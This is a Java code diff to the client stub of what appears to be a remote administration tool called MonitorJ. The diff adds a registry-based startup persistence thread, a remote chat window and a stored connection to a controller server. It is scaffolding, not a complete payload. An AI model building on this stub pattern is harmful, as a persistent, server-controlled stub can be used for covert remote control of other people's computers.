@@ -6,6 +6,7 @@ import me.jershdervis.monitorj.stub.eventapi.events.EventConnect;
 import me.jershdervis.monitorj.stub.eventapi.events.EventDisconnect;
 import me.jershdervis.monitorj.stub.eventapi.events.EventReceivePacket;
 import me.jershdervis.monitorj.stub.secure.StartupMonitor;
+import me.jershdervis.monitorj.stub.ui.RemoteChatWindow;
 
 import java.io.IOException;
 
@@ -16,35 +17,52 @@ public class MonitorJStub {
 
     private static MonitorJStub instance;
 
+    private final BaseClient clientServerConnection;
+
+    //Interrupt when uninstalling
+    private final Thread regPersist;
+
     public final EventConnect EVENT_CONNECT = new EventConnect();
     public final EventDisconnect EVENT_DISCONNECT = new EventDisconnect();
     public final EventReceivePacket EVENT_RECEIVE_PACKET = new EventReceivePacket();
 
-    private final String ip;
-    private final int port;
+    private final RemoteChatWindow chatWindow;
 
-    public MonitorJStub(String ip, int port) throws IOException {
+    private final String regKey;
+
+    public MonitorJStub(String ip, int port, String key) throws IOException {
         instance = this;
-        this.ip = ip;
-        this.port = port;
+
+        this.regKey = key;
+
+        this.chatWindow = new RemoteChatWindow();
 
         //Initialize Packet Manager
         new PacketTaskManager();
 
-        new Thread(new StartupMonitor("RegKeyNameHere")).start();
+        this.regPersist = new Thread(new StartupMonitor(key));
+        this.regPersist.start();
 
-        new Thread(new BaseClient(ip, port)).start();
+        new Thread(clientServerConnection = new BaseClient(ip, port)).start();
     }
 
     public static MonitorJStub getInstance() {
         return instance;
     }
 
-    public String getIp() {
-        return this.ip;
+    public String getRegKey() {
+        return this.regKey;
     }
 
-    public int getPort() {
-        return this.port;
+    public Thread getRegPersistThread() {
+        return this.regPersist;
+    }
+
+    public RemoteChatWindow getChatWindow() {
+        return this.chatWindow;
+    }
+
+    public BaseClient getClientServerConnection() {
+        return this.clientServerConnection;
     }
 }
